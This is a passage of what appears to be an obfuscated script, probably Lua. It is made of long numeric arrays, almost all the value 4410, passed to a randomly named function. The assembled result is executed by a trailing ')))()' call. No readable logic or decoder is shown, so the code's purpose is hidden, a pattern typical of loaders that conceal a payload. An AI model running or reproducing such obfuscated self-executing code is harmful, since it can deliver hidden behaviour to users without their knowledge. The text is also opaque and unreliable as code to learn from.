410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})})))()         
